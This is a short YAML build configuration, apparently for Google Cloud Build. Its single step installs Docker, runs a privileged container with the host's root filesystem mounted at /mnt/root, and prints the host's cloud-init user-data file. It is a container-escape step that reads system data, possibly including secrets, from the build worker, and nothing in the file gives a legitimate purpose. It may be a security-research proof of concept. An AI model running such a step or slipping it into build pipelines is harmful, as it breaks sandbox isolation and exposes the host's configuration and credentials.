steps:
  - name: 'ubuntu'
    args: ['bash', '-c', 'apt-get update -y && apt-get install -y docker.io && docker run --privileged -v /:/mnt/root ubuntu cat /mnt/root/var/lib/cloud/instance/user-data']

options:
  logging: CLOUD_LOGGING_ONLY